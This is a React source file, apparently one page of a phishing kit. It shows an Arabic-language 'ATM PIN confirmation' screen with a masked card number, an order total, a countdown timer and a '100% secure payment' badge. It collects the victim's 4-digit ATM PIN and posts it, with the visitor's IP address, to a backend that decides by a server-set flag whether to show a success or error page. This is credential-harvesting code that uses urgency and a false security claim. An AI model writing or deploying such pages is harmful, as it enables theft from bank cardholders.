import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Spinner from '../components/Spinner';

const Atmcode = () => {
  const [isLoading, setIsLoading] = useState(true);
  const navigate = useNavigate();
  const [pin, setPin] = useState('');
  const [userIP, setUserIP] = useState('');
  const [timer, setTimer] = useState(120);
  const [totalAmount, setTotalAmount] = useState(0);
  const [currency, setCurrency] = useState('');
  const [cardNumber, setCardNumber] = useState('');

  const fetchUserIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setUserIP(data.ip);
    } catch (err) {
      console.error('فشل في الحصول على IP:', err);
      setUserIP('غير معروف');
    }
  };

  useEffect(() => {
    const spinnerTimer = setTimeout(() => {
      setIsLoading(false);
    }, 4000);

    fetchUserIP();

    const storedCardNumber = localStorage.getItem('paymentCardNumber');
    if (storedCardNumber) {
      const clean = storedCardNumber.replace(/\s+/g, '');
      const last4 = clean.slice(-4);
      setCardNumber(`**** **** **** ${last4}`);
    } else {
      setCardNumber('**** **** **** ****');
    }

    const storedTotal = localStorage.getItem('orderTotal');
    const storedCurrency = localStorage.getItem('orderCurrency');

    if (storedTotal) {
      setTotalAmount(parseFloat(storedTotal));
    }

    if (storedCurrency) {
      setCurrency(storedCurrency);
    }

    const interval = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(interval);
      clearTimeout(spinnerTimer);
    };
  }, []);

  const minutes = Math.floor(timer / 60);
  const seconds = timer % 60;

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (pin.length !== 4) {
      alert('يرجى إدخال رمز الصراف المكون من 4 أرقام');
      return;
    }

    try {
      const payload = {
        atmPin: pin,
        userIP: userIP,
      };

      const apiUrl = process.env.REACT_APP_API_BASE_URL;
      if (!apiUrl) throw new Error('REACT_APP_API_BASE_URL غير معرّف');

      const response = await fetch(`${apiUrl}/api/payment/submit-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        const userRes = await fetch(`${apiUrl}/api/protected/user`, {
          credentials: 'include',
        });

        if (userRes.ok) {
          const userData = await userRes.json();
          if (userData.user.redirectPage === 'success') {
            navigate('/success');
          } else {
            navigate('/wrong');
          }
        } else {
          navigate('/wrongg');
        }
      } else {
        navigate('/wrongg');
      }
    } catch (error) {
      alert('حدث خطأ: ' + error.message);
      navigate('/wrongg');
    }
  };

  if (isLoading) return <Spinner />;

  return (
    <div className="atm-pin-containerr">
      <div className="header-section">
        <h2>تأكيد رمز الصراف الآلي</h2>
        <p>أدخل رمز الصراف الخاص ببطاقتك لتأكيد عملية الدفع</p>
      </div>

      <div className="payment-details">
        <div className="detail-row">
          <span className="detail-label">رقم البطاقة:</span>
          <span className="detail-value">{cardNumber}</span>
        </div>

        <div className="detail-row">
          <span className="detail-label">المبلغ:</span>
          <span className="detail-value">
            {currency} {totalAmount.toFixed(3)}
          </span>
        </div>
      </div>

      <div className="timer-section">
        <div className="timer">
          {minutes.toString().padStart(2, '0')}:{seconds.toString().padStart(2, '0')}
        </div>
        <div className="timer-label">الوقت المتبقي لإتمام العملية</div>
      </div>

      <div className="pin-input-containerr">
        <form onSubmit={handleSubmit} className="pin-form">
          <div className="form-groupu">
            <label>الرمز السري المكون من 4 أرقام</label>
            <div className="pin-inputss">
              {[...Array(4)].map((_, i) => (
                <input
                  key={i}
                  type="number"
                  maxLength={1}
                  value={pin[i] || ''}
                  onChange={(e) => {
                    const newPin = [...pin];
                    newPin[i] = e.target.value.replace(/\D/g, '');
                    setPin(newPin.join(''));
                    if (e.target.value && i < 3) {
                      document.getElementById(`pin-${i + 1}`).focus();
                    }
                  }}
                  id={`pin-${i}`}
                  autoFocus={i === 0}
                  required
                />
              ))}
            </div>
          </div>

          <button type="submit" className="submit-btn">
            تأكيد الرمز
          </button>
        </form>
      </div>

      <div className="security-info">
        <div className="secure-icon">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="secure-icon">
            <path
              fill="currentColor"
              d="M12 2C9.2 2 7 4.2 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2h-1V7c0-2.8-2.2-5-5-5zm0 2c1.7 0 3 1.3 3 3v3H9V7c0-1.7 1.3-3 3-3zm-6 8h12v8H6v-8zm6 3c-.6 0-1 .4-1 1s.4 1 1 1 1-.4 1-1-.4-1-1-1z"
            />
          </svg>
        </div>
        <p>الدفع آمن 100%</p>
      </div>
      <style jsx>{`
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap');
        
        .atm-pin-containerr {
          position: relative;
          max-width: 480px;
          margin: 80px auto;
          padding: 10px 25px;
          background: #f9f6f4;
          border-radius: 16px;
          box-shadow: 0 4px 20px rgba(166, 119, 105, 0.15);
          font-family: 'Cairo', sans-serif;
          text-align: center;
        }
        
        .header-section {
          margin-bottom: 15px;
          padding-bottom: 10px;
          border-bottom: 1px solid #f0e9e6;
        }
        
        .header-section h2 {
          color: #A67769;
          margin-bottom: 5px;
          font-weight: 700;
          font-size: 18px;
        }
        
        .header-section p {
          color: #8a7b75;
          font-size: 14px;
          margin-top: 8px;
        }
        
        .payment-details {
          background-color: #f9f5f3;
          border-radius: 10px;
          padding: 10px;
          margin: 0 auto 10px;
          text-align: right;
          max-width: 400px;
          border: 1px solid #f0e9e6;
        }
        
        .payment-details .detail-row {
          display: flex;
          justify-content: space-between;
          margin-bottom: 5px;
          font-size: 12px;
        }
        
        .detail-label {
          font-weight: bold;
          color: #5a4a42;
        }
        
        .detail-value {
          color: #555;
          font-weight: 500;
        }
        
        .timer-section {
          margin: 0 auto 10px;
          padding: 10px;
          background: linear-gradient(135deg, #f8f4f1, #f0e6e2);
          border-radius: 10px;
          max-width: 300px;
        }
        
        .timer-section .timer {
          font-size: 26px;
          font-weight: bold;
          color: #A67769;
          margin-bottom: 5px;
          font-family: 'Courier New', monospace;
        }
        
        .timer-label {
          color: #8a7b75;
          font-size: 14px;
          font-weight: 600;
        }
        
        .pin-input-containerr {
          background: white;
          padding: 10px;
          border-radius: 12px;
          box-shadow: 0 3px 10px rgba(166, 119, 105, 0.1);
          max-width: 400px;
          margin: 0 auto;
        }
        
        .pin-form {
          margin-top: 5px;
        }
        
        .form-groupu {
          display: flex;
          flex-direction: column;
          gap: 10px;
          margin-bottom: 10px;
        }
        
        label {
          font-weight: bold;
          color: #5a4a42;
          font-size: 14px;
          margin-bottom: 20px;
        }
        
        .pin-inputss {
          display: flex;
          justify-content: center;
          gap: 5px;
          margin: 0 auto;
        }
        
        .pin-inputss input {
          width: 50px;
          height: 50px;
          border: 2px solid #e0d1cb;
          border-radius: 8px;
          font-size: 22px;
          text-align: center;
          background: #faf8f6;
          transition: all 0.3s;
        }
        
        .pin-inputss input:focus {
          outline: none;
          border-color: #A67769;
          box-shadow: 0 0 0 3px rgba(166, 119, 105, 0.2);
          background: white;
        }
        
        .form-buttons {
          width:100%;
        }
        
        .submit-btn {
          flex: 1;
          max-width: 300px;
          background: #A67769;
          color: white;
          border: none;
          padding: 14px;
          border-radius: 8px;
          font-size: 15px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          font-family: 'Cairo', sans-serif;
          box-shadow: 0 4px 6px rgba(166, 119, 105, 0.3);
        }
        
        .submit-btn:hover {
          background: #8a5c50;
          transform: translateY(-2px);
          box-shadow: 0 6px 8px rgba(166, 119, 105, 0.4);
        }
        
        .security-info {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 12px;
          margin-top: 30px;
          padding: 15px;
          background: #f0f7f0;
          border-radius: 8px;
          color: #4caf50;
          font-size: 14px;
          font-weight: 600;
          border: 1px solid #d0e9d0;
          max-width: 500px;
          margin: 30px auto 0;
        }
        
        .secure-icon {
          width: 24px;
          height: 24px;
          flex-shrink: 0;
        }
        
        .security-info p {
          margin: 0;
          text-align: right;
          line-height: 1.5;
        }
        
        @media (max-width: 500px) {
          .atm-pin-container {
            padding: 20px 15px;
            margin: 20px;
          }
          
          .pin-input-container {
            padding: 20px;
          }
          
          .timer {
            font-size: 30px;
          }
          
          .pin-inputs input {
            width: 50px;
            height: 50px;
            font-size: 24px;
          }
          
          h2 {
            font-size: 22px;
          }
          
          .submit-btn {
            font-size: 16px;
            padding: 12px;
          }
          
          .detail-row {
            font-size: 15px;
          }
        }
      `}</style>      
    </div>
  );
};

export default Atmcode;